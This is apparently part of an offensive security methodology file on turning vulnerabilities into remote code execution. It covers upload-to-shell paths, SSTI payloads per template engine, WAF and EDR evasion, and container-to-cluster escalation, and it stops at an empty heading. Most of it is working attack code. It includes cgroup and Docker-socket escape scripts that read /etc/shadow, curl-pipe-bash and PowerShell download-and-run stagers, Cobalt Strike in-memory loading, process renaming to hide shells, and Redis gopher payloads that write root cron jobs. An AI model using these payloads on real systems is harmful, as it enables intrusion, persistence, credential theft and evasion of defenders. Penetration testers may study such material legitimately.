- **CVE-2018-16509 (-dSAFER bypass)**: earlier Ghostscript `-dSAFER` mode was believed to sandbox risky operators; researcher work showed the sandbox was leaky in specific PostScript-language constructs. Modern GS shipped `-dSAFER` by default and removed some leaky operators; a target running `-dNOSAFER` or bundling GS before 10.02 is in class.
- **Delivery**: any pipeline that passes user-uploaded PDFs through Ghostscript (LibreOffice convert, ImageMagick's PDF delegate, poppler + gs fallback) — the shell fires during rendering.
- **Confirmation**: OAST callback from within the render pipeline, or an in-band file drop that the rendered output includes.

### ExifTool — DjVu literal reaches Perl `eval` (CVE-2021-22204)

- **The class**: ExifTool historically parsed DjVu annotations through Perl `eval` on a substring extracted from the file. A crafted DjVu with an annotation string containing Perl code reached exec. Fixed in 12.24; targets running older ExifTool are in class.
- **Delivery**: uploads that pass through ExifTool for metadata stripping (many image/PDF processing pipelines).
- **Confirmation**: OAST callback from the pipeline, in-band file drop.

### LaTeX — `\write18` and pandoc filters

- **The class**: LaTeX's `\write18` primitive invokes a shell command; enabled when the engine is invoked with `-shell-escape` or `--shell-escape`. `pdflatex --shell-escape` is common in build systems that render user LaTeX to PDF. `\write18{id > /tmp/o}` executes.
- **Alternative**: some engines allow `\input{|"id"}` — piping through a shell during input inclusion.
- **Pandoc filters**: Pandoc supports `--filter` which invokes a script; if the filter path is attacker-influenced, arbitrary program invocation. Distinct primitive from LaTeX itself.
- **Confirmation**: OAST callback from within the render, or an in-band file drop that ends up in the produced PDF.

### ffmpeg — concat protocol and protocol_whitelist

- **The class**: ffmpeg's `concat:` protocol reads a manifest listing files to concatenate. Combined with a permissive `protocol_whitelist` (which controls which protocols the manifest may reference), the manifest can reference `file:`, `http:`, `data:`, etc., producing arbitrary file-read primitives — and if the resulting output is served, in-band file exfil.
- **Not directly RCE** in the general case, but a stepping-stone: an ffmpeg-reachable file-read that reaches `/proc/self/environ` (env-var exfil), `/etc/passwd`, or the target's `.env` chains into a credential-based next primitive.
- **Confirmation**: the produced output file, when served, contains fragments of the read file's content.

For all media pipeline classes: the mitigation is downstream — the caller runs the pipeline in a sandbox (seccomp, gVisor, unprivileged Docker) that denies the shell primitive even if the exploit fires. Test whether the pipeline runs sandboxed by grep for `seccomp`, `apparmor`, or a container runtime in the process tree.

## File Upload to RCE — Per-Server Execution Paths

When a file-upload primitive exists (confirmed via `insecure_file_uploads`), the transition to RCE depends on the web server's *execution mapping* — which file extensions, content types, and path patterns trigger server-side code execution. Each server family has its own rules.

### Apache httpd

- **Extension mapping via AddHandler/AddType.** Apache maps extensions to handlers; `.php` invokes `mod_php` or PHP-FPM. Double extensions (`.php.jpg`) are dangerous when `AddHandler` matches on the first extension. Test: upload `test.php.jpg` and request it — if the response contains PHP output, the double-extension bypass works.
- **.htaccess upload.** If the upload directory allows `.htaccess` creation and `AllowOverride` is `All` or `FileInfo`, uploading `.htaccess` with `AddType application/x-httpd-php .jpg` makes every `.jpg` in that directory execute as PHP.
- **mod_cgi.** If enabled with `Options +ExecCGI`, any file with execute permission and a valid shebang runs as a CGI script.

### Nginx

- **PATH_INFO misconfiguration.** The canonical Nginx-PHP misconfiguration: `try_files $uri =404` is missing, and `fastcgi_split_path_info` splits on `^(.+\.php)(/.+)$`. Request `/uploads/image.jpg/x.php` — Nginx passes `SCRIPT_FILENAME=/uploads/image.jpg` to PHP-FPM, and `cgi.fix_pathinfo=1` (the default) strips the trailing path and executes `image.jpg` as PHP.
- **Alias traversal.** An `alias` directive without trailing slash (`location /static { alias /data/uploads; }`) allows path traversal — `/static../config/app.py` reaches outside the intended directory.

### IIS / ASP.NET

- **Handler mappings.** `.aspx`, `.ashx`, `.asmx`, `.svc` extensions trigger ASP.NET execution. Upload a `.aspx` webshell to a writable directory and request it.
- **web.config upload.** Upload a `web.config` with a handler mapping that executes a custom extension as ASP.NET — the IIS equivalent of Apache's `.htaccess` bypass.
- **Short filename (8.3) enumeration.** IIS serves files by their 8.3 short name — `webshell.aspx` becomes `WEBSHE~1.ASP`. Even if the long name is filtered, the short name may not be.

### Tomcat / Java Servlet Containers

- **JSP execution.** Tomcat executes `.jsp` files in any directory where the JSP servlet is mapped (default: all). Upload a `.jsp` shell and request it.
- **WAR deployment.** If Tomcat Manager is reachable (common default creds: `tomcat:tomcat`), deploy a `.war` containing a JSP shell via the manager endpoint.
- **PUT method.** If `readonly=false` in the DefaultServlet's init-param, `PUT /shell.jsp` with JSP content directly creates an executable file.

### Polyglot File Shells

When extension filters block obvious shells, a polyglot file passes both format validation and execution:

- **JPEG-PHP polyglot.** Valid JPEG (passes `getimagesize()`) with PHP code in EXIF comment or appended after the JPEG end-of-image marker (`FF D9`). Execution requires the server to process the extension as PHP.
- **PNG-PHP polyglot.** PHP code injected into the PNG `tEXt` or `iTXt` chunk. Some image-processing libraries strip text chunks — test empirically.
- **GIF-PHP polyglot.** `GIF89a` magic bytes followed by `<?php system($_GET[0]); ?>` — passes a `file`-command-based MIME check.
- **ZIP-based.** A ZIP file is valid from its end-of-central-directory record — prepend arbitrary data before the ZIP structure to create a ZIP-PHP polyglot that is both a valid ZIP and executable PHP.

Confirmation for all: request the uploaded file; if the response contains the output of the injected code (not the code itself), execution occurred. Load `insecure_file_uploads` for the upload-path discovery and content-type bypass methodology.

## In-Memory Persistence and Reverse-Shell Shape Optimization

The base file's reverse-shell one-liners write nothing to disk but do spawn a new process. Advanced discipline: minimize what lands on disk (which forensic tools grep for) and minimize what spawns visibly (which EDR flags on process creation).

### In-memory-only shell shapes

- **Bash `/dev/tcp` shape** (from the base file) writes zero files. The shell is bash-in-bash; no new binary reaches disk.
- **Python's `pty.spawn('/bin/bash')`** reuses the existing python interpreter; the bash spawn is visible in `ps` but no new persisted binary.
- **PowerShell in-memory .NET assembly load**: `[Reflection.Assembly]::Load([Convert]::FromBase64String('<b64>')).EntryPoint.Invoke($null, $null)` loads a .NET assembly from a base64 string, entirely in memory. The base64 payload can be a compiled Cobalt Strike / Mythic / Sliver stager. No .exe on disk.

### Avoiding file drops for stagers

- **Curl-to-pipe-to-interpreter**: `curl -s https://x.tld/s | bash` reaches the shell without writing a file. The URL is what a defender's HTTP proxy logs, not a file hash. In-memory only; forensic recovery requires a memory-image capture.
- **PowerShell IEX**: `iex(New-Object Net.WebClient).DownloadString('https://x.tld/s.ps1')` — same shape, PowerShell edition.
- **Node `-e`**: `node -e "$(curl -s https://x.tld/s.js)"` — the JS runs inline, without ever landing as a file.

### Process-tree obfuscation

- **Parent-process choice**: a spawn from `nginx` looks different from a spawn from `bash` in an EDR feed. Where the RCE sink is one process type, staying within that type reduces alarm — `system('curl https://x.tld/s | node -e "$(cat)"')` from a Node process is more suspicious than `require('child_process').exec(fetchedString)` in-process.
- **Argv obfuscation**: `sh -c 'exec -a nginx-worker /bin/bash -i'` renames the shell process for `ps` output.
- **Environment scrub**: `env -i /bin/bash -c '...'` starts a shell with a clean environment; useful when auditd tracks env-var flags.

### Container-context reverse shells

Container filesystems are usually ephemeral, so persistence on the container is pointless. Persistence targets the host or the orchestrator:

- **Docker socket present**: `curl --unix-socket /var/run/docker.sock http://localhost/containers/create -d '<container-spec>'` creates a new container from a fresh image; if the new container has host mounts, you have persistence.
- **Kubelet reachable**: the container's own kubectl-shape API can create pods on other nodes.
- **Cloud metadata credentials**: instance-role credentials from IMDSv2 (routed to `cloud/aws.md`) grant AWS-side persistence — Lambda deploy, EC2 create-image with a backdoor, IAM user creation.

Load `cloud/kubernetes.md` and `cloud/aws.md` for the durable-persistence-on-orchestrator methodology.

## Cache and ETag Oracle Methodology

The Level 5 in-band echo assumes the response reflects the exec output. When it doesn't — the sink is behind a caching layer, or the response is fixed-shape — the response's *metadata* still varies. Blind extraction methodology exploits the variation.

- **Content-Length differential**: `; id > /tmp/x; cat /tmp/x | wc -c` reaches a size-side channel; the response's Content-Length may reflect the byte count. Extract `uid=` character-by-character via boolean-oracle logic (payload varies size by 1 depending on the character extracted).
- **ETag oracle**: some servers compute ETags as hashes of the response body. `; id > /tmp/x; cat /tmp/x` reaches a body-content channel; ETag hashes differ per output byte. Extract via a rainbow-table-shape lookup on ETags.
- **Response time differential (Level 4 refined)**: `; if [ $(id -u) -eq 0 ]; then sleep 5; fi` extracts a single bit (root-or-not) via timing. Chain bit extractions for larger values.
- **HTTP status differential**: `; test -f /root/.ssh/authorized_keys && exit 0 || exit 1` reaches an exit-code channel that some frameworks translate to HTTP 200 vs 500 differentials.
- **Cache-key differential**: a cached response's cache key may be computed from the response body; a bytes-into-cache-key encoding extracts values via cache hits/misses on subsequent requests.

Each oracle requires the sink's output surface to expose *some* varying observable. When none is available and Level 5 in-band is out, the finding may need to be reported as "unblind-able RCE candidate — recommend caller-side confirmation."

## Container-to-Cluster Escalation Ladder

The base file names runc CVE-2024-21626 as the runtime-layer breakout. The full escalation from an in-container RCE to control of the cluster is a multi-hop ladder — each hop is a distinct primitive with confirmation.

- **Hop 0 — RCE inside the container**. Confirmed via any base-file rung.
- **Hop 1 — enumerate the container's own escape surface**. `/proc/1/cgroup` reveals the runtime (docker/containerd/cri-o); `/.dockerenv` confirms Docker; `mount | grep -Ei '(docker|overlay)'` names the storage driver; `capsh --print` lists capabilities. Missing `SYS_ADMIN` and read-only `/proc/sys` mean the standard Docker-Docker escapes are closed; still test for a mounted socket.
- **Hop 2 — mount surface**. `ls -la /var/run/docker.sock` — a writable socket is host takeover (`docker run -v /:/host --privileged` from inside the container reaches the host root). `mount | grep bind` finds host-directory bind mounts. `/host` mounts are common in operator-privileged containers.
- **Hop 3 — capability abuse**. `SYS_ADMIN` enables `mount`-shape escapes (`mount -t proc proc /proc` in a new PID namespace). `SYS_MODULE` enables `modprobe` loading arbitrary kernel modules. `DAC_READ_SEARCH` bypasses file DAC checks. Enumerate what the container has and match to known-abusive capabilities.
- **Hop 4 — runtime CVE class**. runc CVE-2024-21626 (base file's Dockerfile WORKDIR primitive) or the analogous BuildKit surface. If the target's runc is patched to 1.1.12+, this hop closes; if not, it's a one-step host breakout.
- **Hop 5 — kubelet / cluster metadata**. From the host or a well-connected container, `curl --insecure https://<node>:10250/pods` enumerates pods on the node; `curl --insecure https://<node>:10250/exec/<ns>/<pod>/<container>?command=...` exec into another pod. Confirmed via the exec response.
- **Hop 6 — cluster admin**. The service-account tokens on the node (or in `/var/lib/kubelet/pods/*/volumes/kubernetes.io~secret/`) enumerate RBAC; a bindings check against `secrets` and `pods/exec` scopes the reach. Load `cloud/kubernetes.md` for the full cluster-side pivot ladder.

Each hop has its own confirmation. Report the *hop reached* and the capability transferred, not "container escape → cluster admin" as a single claim.

## Container Escape Exploit Primitives

The preceding escalation ladder names the hops; this section provides the specific payloads and confirmation for each escape primitive.

### SYS_ADMIN Capability — cgroup release_agent Escape

When a container has `CAP_SYS_ADMIN` (common in privileged-adjacent configurations), the cgroup `release_agent` mechanism provides a host-code-execution primitive:

```bash
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "curl http://OAST/$(hostname -f)" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

The `release_agent` script runs on the **host** when the cgroup empties. Confirmation: the OAST callback carries the host's hostname, not the container's. Substitute `rdma` with `memory` or `cpu` if `rdma` is unavailable.

### Docker Socket Abuse

A writable `/var/run/docker.sock` is a single-step host takeover:

```bash
curl -s --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh","-c","cat /host/etc/shadow > /host/tmp/exfil"],"HostConfig":{"Binds":["/:/host"],"Privileged":true}}' \
  http://localhost/containers/create
# Start the created container:
curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/containers/<id>/start
```

The new container runs as host root with the host filesystem at `/host`. Confirmation: read the exfiltrated file, or OAST callback from inside the new container carrying host-context data.

### Privileged Mode — Device Access and Module Loading

A `--privileged` container has all capabilities and device access:

```bash
fdisk -l                           # find the host disk (usually /dev/sda1)
mkdir /mnt/host && mount /dev/sda1 /mnt/host
chroot /mnt/host /bin/bash        # full host shell
```

For kernel-module loading (requires `SYS_MODULE`): `insmod /path/to/module.ko` — the module runs in host kernel space.

### /proc/sys/kernel/core_pattern Escape

When `/proc/sys/kernel/core_pattern` is writable (requires host PID namespace or misconfigured seccomp):

```bash
echo '|/path/on/host/exploit.sh' > /proc/sys/kernel/core_pattern
# Trigger a core dump — the kernel invokes the pipe target on the host
```

The `|` prefix tells the kernel to pipe the core dump to a program. The program path resolves on the **host** filesystem.

### nsenter from Host PID Namespace

When the container shares the host's PID namespace (`--pid=host`):

```bash
nsenter -t 1 -m -u -i -n -p -- /bin/bash
```

This enters PID 1's namespaces (mount, UTS, IPC, network, PID) — a full host shell. Confirmation: `hostname` returns the host's name, not the container's.

## SSTI to RCE — Per-Engine Sandbox-Escape Transitions

The base file covers the Jinja2 class-walk chain and the JavaScript `constructor.constructor` → `Function()` chain. This section extends to the per-engine transition from template-expression evaluation to arbitrary code execution — the specific sink each engine exposes, and the sandbox-escape path where one exists.

### Jinja2 (Python) — Class-Walk Variations

Beyond the canonical `lipsum.__globals__['os'].popen('id')` chain, multiple entry points reach the same `os` module:

```
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```

The `__subclasses__()` enumeration is the fallback when direct `__globals__` access is blocked — walk `object.__subclasses__()` to find a class whose `__init__.__globals__` contains `os` or `subprocess`. The index varies per Python installation; a loop-probe finds it dynamically:

```
{% for c in ''.__class__.__mro__[1].__subclasses__() %}
  {% if c.__name__ == 'Popen' %}
    {{ c('id', shell=True, stdout=-1).communicate() }}
  {% endif %}
{% endfor %}
```

**SandboxedEnvironment** blocks `__`-prefixed attribute access via `is_safe_attribute`. Early bypasses used `|attr('__class__')` — `{{ ''|attr('__class__')|attr('__mro__') }}` reached the same chain via the `attr` filter. Jinja2 hardened `SandboxedEnvironment` over successive versions to also block `attr()` calls that reach dunder attributes. On current Jinja2 (3.1+), `SandboxedEnvironment` is considered hardened — but the default `Environment` is not, and that is the common finding.

### Twig (PHP) — Callback Registration

Twig without sandbox mode:

```
{{ _self.env.registerUndefinedFilterCallback("system") }}{{ _self.env.getFilter("id") }}
```

`registerUndefinedFilterCallback` sets a callback invoked when an unknown filter is requested — setting it to `"system"` and then requesting the filter `"id"` calls `system("id")`.

In Twig 3.x, `_self` no longer exposes `env` directly. The alternative:

```
{{ ['id'] | map('system') }}
{{ ['id'] | filter('system') }}
{{ ['id'] | sort('system') }}
```

The `map`, `filter`, and `sort` filters accept a callable as argument. PHP resolves the string `'system'` to the `system()` function, so each filter invokes `system('id')` via `array_map`, `array_filter`, or `usort`.

### Freemarker (Java) — ?new() Built-in

Freemarker's `?new()` built-in instantiates a Java class implementing `TemplateModel`:

```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

`freemarker.template.utility.Execute` calls `Runtime.getRuntime().exec(cmd)` in its `exec` method. When `?new()` is restricted by `new_builtin_class_resolver` (set to `SAFER_RESOLVER`), the built-in blocks `Execute`. Alternative via `?api` (when `api_builtin_enabled=true`):

```
<#assign cl=object?api.getClass().forName("java.lang.Runtime")>
${cl.getMethod("exec",object?api.getClass().forName("java.lang.String")).invoke(cl.getMethod("getRuntime").invoke(null),"id")}
```

This uses Java reflection directly from the template.

### Velocity (Java) — Reflection Chain

Apache Velocity does not sandbox by default:

```
#set($rt = $x.class.forName("java.lang.Runtime"))
#set($exec = $rt.getMethod("exec", $x.class.forName("java.lang.String")))
#set($process = $exec.invoke($rt.getMethod("getRuntime").invoke(null), "id"))
```

`$x` can be any variable in the template context — Velocity's `$request`, `$response`, or `$context` objects all have `getClass()`. The chain walks Java reflection from any available object to `Runtime.exec`.

### Thymeleaf (Java) — Expression Preprocessing to SpEL

Thymeleaf's expression preprocessing (`__${...}__`) evaluates the inner expression *before* the outer template:

```
__${T(java.lang.Runtime).getRuntime().exec("id")}__::x
```

When a Thymeleaf template name or fragment expression is user-controlled, preprocessing evaluates arbitrary SpEL. The `T()` operator accesses Java types directly. This is the most common Thymeleaf-to-RCE path in Spring applications where a controller returns a user-influenced view name.

### ERB (Ruby) — Direct Code Execution

ERB has no sandbox. ERB tags execute arbitrary Ruby:

```
<%= system("id") %>
<%= `id` %>
<%= IO.popen("id").read %>
```

The sink exists whenever user input reaches `ERB.new(input).result`. Unlike other engines, there is no sandbox-vs-unsandboxed differential — all ERB evaluation is full Ruby exec.

### EJS / Pug / Nunjucks (Node.js) — Global Access to require

Node.js template engines that expose global objects provide a path to `require('child_process')`:

**EJS:** `<%= global.process.mainModule.require('child_process').execSync('id').toString() %>`

**Pug:**
```
- var x = global.process.mainModule.require('child_process').execSync('id').toString()
= x
```

**Nunjucks:** uses the `constructor.constructor` chain documented in the base file, reaching `Function('return this')().process.mainModule.require('child_process').execSync('id')`.

**Handlebars:** prototype access via `__proto__` or `constructor` in template expressions reached arbitrary properties in versions before 4.7.7. Modern Handlebars blocks prototype traversal by default, but custom helpers registered by the application may re-expose the surface.

The per-engine discovery: identify the template engine via error-response fingerprinting (`{{7*7}}` → `49` and `${7*7}` → `49` probe different engine families), then select the engine-specific chain from this catalog.

## WAF and Filter Bypass Classes for RCE

Where a naive WAF blocks `; id` or `& powershell`, the payload's *shape* is what matched. Vary the shape.

### Bash builtin substitution

- **Character-set substitution**: `$'\x69\x64'` evaluates to `id` at parse time; the literal `id` never appears. `$'\x77\x68\x6f\x61\x6d\x69'` = `whoami`. Portable across bash, zsh, ksh.
- **Positional-parameter reuse**: `${!#}` or `${@:1}` reuse earlier args; can help when the WAF looks at contiguous arg strings.
- **Variable-name substitution**: `a=id; $a` — split the sink name across two lexical positions.
- **Command substitution nesting**: `$(echo aWQ= | base64 -d)` = `id`; base64 decoding evades a substring filter for `id`.
- **IFS substitution**: `X=$IFS; echo${X}$(id)` — a filter looking for literal spaces misses the `$IFS`-supplied space.

### PowerShell obfuscation

- **Encoded command**: `powershell -EncodedCommand <base64>` where the base64 decodes to UTF-16LE-encoded PowerShell. The literal command never appears in the argv position the WAF inspected.
- **Invocation obfuscation**: `iex ($('id'))`, `.('id')`, `& ('id')` — three different invocation forms for the same effect.
- **String-format obfuscation**: `("{2}{1}{0}" -f 'i','d','')` — reorder and reassemble.
- **Alias substitution**: `gci` for `Get-ChildItem`, `sal` for `Set-Alias`; alias-your-own-command can hide the actual invocation.

### Tokenizer/parser layer differentials

Where the WAF and the shell tokenize differently, the disagreement is the bypass:

- **Comment insertion (Bash)**: `id #suffix` — the shell strips `#suffix`, the WAF may not.
- **Line-continuation**: `id\` on a line followed by whitespace and continuation — some WAFs collapse the line, some do not.
- **Unicode-normalization differentials**: full-width `ｉｄ` may or may not normalize to `id` in the WAF's tokenizer; the shell doesn't normalize.
- **Encoding-differential URL decoding**: double-URL-encode the payload; if the WAF decodes once and the app decodes twice, the WAF sees literal `%3B%69%64` and the shell sees `; id`.

### Encoding matched to the decode surface

Every encoding technique's correctness depends on knowing *what* decodes *before* the sink. Match the encoding to what's decoded, not to what's obvious:

- HTTP form-encoded params URL-decode once at the app boundary; a further URL-encode in the payload survives that decode as literal.
- JSON string parsing decodes `\uXXXX` and `\xXX` — `"\u0069\u0064"` reaches the sink as `id`.
- Multipart form-data parsing may or may not decode; test the target's decode behavior first.

Load `rce_novel_deep` for the 2024–2026 published parser-differential bypass classes.

## Per-Language Eval and Code-Execution Sinks

The base file's exec-sink table covers the shell-vs-array command execution boundary. This section catalogs the *eval-family* sinks — language primitives that compile and execute a string as code within the application process, without spawning a subprocess. These are higher-privilege sinks than command execution: they run inside the process with full access to the application's memory, credentials, and connected resources.

### Python

| Sink | Primitive | Notes |
|---|---|---|
| `eval(expr)` | Evaluates a single expression; returns its value | No statements; use `exec` for multi-line |
| `exec(code)` | Executes arbitrary Python statements | Full language access including imports |
| `compile(code, '', 'exec')` | Compiles to bytecode; execution via `exec(compiled)` | Two-step; the `compile` call alone is not exec |
| `__import__(name)` | Imports a module by name | `__import__('os').system('id')` is a single-expression exec chain reachable from `eval` |

The Python discipline: `eval` on untrusted input is RCE. There is no "safe subset" of `eval` that admits expressions but blocks import — `eval("__import__('os').system('id')")` is a single expression. `ast.literal_eval` is the only safe alternative; it evaluates only literals (strings, numbers, tuples, lists, dicts, booleans, None).

### Node.js / JavaScript

| Sink | Primitive | Notes |
|---|---|---|
| `eval(code)` | Executes arbitrary JS in the current scope | Full access to `require`, `process`, `global` |
| `Function(code)` | Creates a new function from a string body | `new Function('return process')().mainModule.require('child_process').execSync('id')` |
| `vm.runInNewContext(code, sandbox)` | Runs code in a new V8 context with the given sandbox | Sandbox escapes exist via `this.constructor.constructor('return process')()` — the `constructor` chain reaches the outer context |
| `vm.runInThisContext(code)` | Runs code in the current context — no sandbox at all | Equivalent to `eval` |
| `setTimeout(code, ms)` / `setInterval(code, ms)` | When passed a string (not a function), evaluates it | Rare in modern code; legacy pattern |

The vm2 sandbox (deprecated) has multiple known escapes via prototype manipulation. Any reliance on vm2 for security isolation is a finding.

### PHP

| Sink | Primitive | Notes |
|---|---|---|
| `eval($code)` | Executes arbitrary PHP | `eval('system("id");')` |
| `assert($expr)` | Pre-PHP 8.0: evaluates string argument as PHP code | Removed as code-eval in PHP 8.0 |
| `preg_replace($p, $r, $s)` | Pre-PHP 7.0: the `/e` modifier evaluates `$replacement` as PHP | Removed in PHP 7.0 |
| `create_function($args, $body)` | Creates anonymous function from string body | Deprecated 7.2, removed 8.0 |
| `call_user_func($callable, ...)` | Calls a named function | `call_user_func('system', 'id')` — string-to-function-call |
| `include` / `require` | Executes the included file as PHP | LFI → RCE when the included path is attacker-controlled |

### Ruby

| Sink | Primitive | Notes |
|---|---|---|
| `eval(code)` | Executes arbitrary Ruby in the current binding | Full access |
| `Kernel#send(method, *args)` | Invokes a named method on an object | `obj.send(:system, 'id')` — method name as symbol or string |
| `public_send(method, *args)` | Like `send` but only public methods | Same exec surface for public methods like `system` |
| `instance_eval(code)` | Evaluates code in the context of the receiver | Access to private methods and instance variables |
| `class_eval(code)` | Evaluates code in the context of a class/module | Can define new methods or override existing ones |

### Go

Go has no `eval`-family sink — the language is compiled, not interpreted. The residual exec surface: `plugin.Open(path)` loads a shared object and runs its `init()` function (attacker-controlled path = RCE); `reflect` can call methods by name but cannot create new code; CGo bridges to C functions with exec semantics. The primary Go exec sink is `os/exec` (documented in the base file's exec-sink table).

### Java

| Sink | Primitive | Notes |
|---|---|---|
| `ScriptEngine.eval(code)` | Nashorn (Java 8–14) or GraalJS evaluates JavaScript | Reaches `Runtime.exec` via Java-JS interop |
| OGNL `getValue(expr, ctx)` | Object-Graph Navigation Language expression | Struts2 OGNL injection reaches `Runtime.exec` |
| SpEL `parseExpression(expr).getValue()` | Spring Expression Language | `T(java.lang.Runtime).getRuntime().exec('id')` |
| MVEL `MVEL.eval(expr)` | MVFLEX Expression Language | Full Java method access |

The per-language discipline: identify the runtime, then enumerate eval-family sinks by grepping for the sink patterns above. A string-to-code sink on untrusted input is RCE regardless of the surrounding framework.

## OS Command Injection — Per-Shell Metacharacter and Quoting Depth

The base file's exec-sink table documents *whether* a shell is invoked. When it is, the injection surface depends on *which* shell processes the string and what metacharacters that shell recognizes. Different shells parse differently — a payload that works in bash may fail in dash, and a cmd.exe payload is structurally different from a PowerShell payload.

### POSIX sh / dash / ash (minimal shells)

Many containers and Alpine-based images use `dash` or BusyBox `ash` as `/bin/sh`, not bash. These minimal shells support a subset of bash's features:

- **Supported metacharacters:** `;`, `|`, `||`, `&&`, `&`, `$(cmd)`, `` `cmd` ``, `>`, `>>`, `<`, newline
- **Not supported:** `$'\xNN'` hex escapes (bash extension), `{a,b}` brace expansion (bash), `<<<` here-strings (bash), process substitution `<(cmd)` (bash)
- **Quoting:** single quotes prevent all interpretation; double quotes allow `$`, `` ` ``, `\`

The consequence: bash-specific evasion payloads (`$'\x69\x64'` for `id`) silently fail in dash/ash. Test with POSIX-portable constructs first, then attempt bash extensions only if `/bin/bash` exists on the target. `readlink /bin/sh` identifies the actual shell.

### bash-Specific Extensions

Beyond POSIX, bash adds:

- **Brace expansion:** `{cat,/etc/passwd}` expands to `cat /etc/passwd` — a space-free command. Useful when spaces are filtered.
- **$'\xNN' / $'\uNNNN':** hex and Unicode escapes evaluated at parse time. `$'\x69\x64'` → `id`. Must be in `$'...'` syntax, not inside double quotes.
- **${!var}:** indirect expansion — `x=PATH; echo ${!x}` prints `$PATH`. Exfiltrates environment variables when variable names are attacker-controlled.
- **BASH_ENV / ENV:** if set, bash sources the named file on startup for non-interactive shells. Polluting `BASH_ENV` is a persistence primitive.
- **Process substitution:** `<(cmd)` and `>(cmd)` — creates named-pipe FDs connected to subshell output/input.

### zsh

zsh is the default shell on macOS and some developer workstations:

- **Word splitting:** zsh does NOT split unquoted parameter expansions by default (unlike bash). `x="a b"; cmd $x` passes one argument in zsh, two in bash. Payloads that rely on word splitting may fail.
- **Extended globbing:** `**/*.php` (recursive glob), `*(.)` (regular files only). Globbing differences can cause payloads to expand unexpectedly.
- **Null-glob:** zsh's `setopt NULL_GLOB` makes unmatched globs expand to nothing. A payload relying on a glob not matching may behave differently.

### cmd.exe (Windows)

cmd.exe's metacharacter set is distinct from POSIX shells:

- **Command separators:** `&` (unconditional), `&&` (on success), `||` (on failure)
- **Escape character:** `^` escapes the next character — `^&` is a literal `&`
- **Variable expansion:** `%VAR%` (immediate), `!VAR!` (delayed, when `EnableDelayedExpansion` is active)
- **No `$(cmd)` or backtick substitution.** Command substitution uses `for /f` loops — verbose and rarely injectable.
- **Quoting:** double quotes group arguments but do NOT prevent metacharacter interpretation — `"arg & id"` still executes `id`. This is the fundamental difference from POSIX shells.

The last point is critical: POSIX-shell escaping (`'arg & id'` with single quotes) prevents injection; cmd.exe has no equivalent single-quote mechanism. The BatBadBut class (see the Windows CreateProcess section above) exploits exactly this difference.

### PowerShell

- **Command separators:** `;`
- **Subexpression:** `$( )` — evaluated and output substituted
- **Execution operators:** `& <cmd>` (call operator), `. <script>` (dot-source)
- **Escape character:** backtick `` ` `` — `` `n `` is newline, `` `t `` is tab
- **String interpolation:** `"text $(cmd) text"` — expressions inside `$()` in double-quoted strings are evaluated
- **Encoded command:** `-EncodedCommand <base64>` accepts UTF-16LE base64-encoded PowerShell — the entire payload is opaque to text-based filters. The most reliable WAF evasion for PowerShell sinks.

### Newline and Tab Injection

Across all shells, `\n` (0x0a) is a command separator. A URL-encoded `%0a` in a parameter that reaches a shell sink terminates the current command and starts a new one — this bypasses WAFs that look for `;`, `|`, or `&` but not literal newlines:

```
param=value%0aid%0a    →    param=value\nid\n
```

Tab (`\t` / 0x09) substitutes for space when spaces are filtered — POSIX shells and cmd.exe treat tab as whitespace. Null bytes (`\0` / 0x00) have varying behavior: C-based parsers truncate at null, which can cause a null-injection bypass where the shell-escaping function and the shell disagree on where the string ends.

## Chained-Primitive Exploitation

Every RCE finding in the field is a chain — a first primitive reaches a next primitive that reaches durable impact. Compose per capability, not per vulnerability class.

### Deserialization → file-write → persistence

The gadget reaches `FileOutputStream` (or `PrintWriter`) to write a small file to a location the app or the OS re-executes:

- `~/.bashrc` / `~/.profile` — next shell login runs your code.
- `/etc/cron.d/<file>` — cron picks it up at next minute mark.
- `/var/www/html/x.php` — HTTP request re-triggers PHP execution.
- `~/.ssh/authorized_keys` — attacker's public key grants ssh.

The deserialization is one step; the file-write is the *primitive*; the persistence is the impact. Confirmation: after the write, fetch the file back via HTTP (or in the ssh case, attempt the ssh login) — the fetch response body / ssh handshake confirms persistence, not just the deserialization.

### SSRF → Redis → exec (gopher://)

A blind SSRF reaches an internal Redis (default port 6379, no auth in dev configs). Redis's protocol is line-oriented and can be built as a `gopher://` payload — every Redis command runs.

- `gopher://internal-redis:6379/_SET%20x%20"attacker-payload"%0d%0aCONFIG%20SET%20dir%20/var/spool/cron/crontabs%0d%0aCONFIG%20SET%20dbfilename%20root%0d%0aSAVE%0d%0a` — writes a cron entry as root.
- `gopher://internal-redis:6379/_MODULE%20LOAD%20/path/to/exp.so` — module load, if the target Redis version allows module load (Redis 4.0+).

Confirmation: the cron entry fires at the next minute mark — the entry's command is `curl OAST/$(id)`. Load `ssrf_advanced_deep` for the gopher construction methodology and `ssrf.md` for the primitive discovery.

### SSRF → FastCGI → exec (gopher://)

A blind SSRF reaches an internal PHP-FPM socket (default TCP 9000, or Unix socket at `/var/run/php-fpm.sock`). FastCGI's protocol can be built as a gopher payload — build FPM records to invoke `system('id')` with `PHP_ADMIN_VALUE` allowing `auto_prepend_file`.

Confirmation: the FPM record's response body carries the PHP `system` output. Load `ssrf_advanced_deep` for the FCGI record construction.

### PP → child_process gadget chain from a source of pollution

A source of pollution (a Lodash-family merge, an unmerged `Object.assign` on user JSON, a query-string parser like `qs` or `body-parser` with unfiltered `[]`-syntax) writes an attacker-controlled key/value to `Object.prototype`. If any downstream code path spawns a subprocess without explicit `options`, the base file's universal `child_process` gadget fires.

- Source: `req.body._proto__ = { shell: 'node', env: { NODE_OPTIONS: '--inspect-brk=0.0.0.0:1337' } }` (or the merge-shape equivalent).
- Sink: any `child_process.spawn(...)` in the app's dependency graph without explicit options.
- Chain: pollution runs → any subsequent spawn opens the Node inspector → attacker attaches → arbitrary JS in-process.

Confirmation: attacker connects to `http://target:1337/json/version`, then attaches with a Chrome DevTools protocol client. Load `prototype_pollution` for the source-of-pollution discovery methodology.

### Template injection with prefix constraints

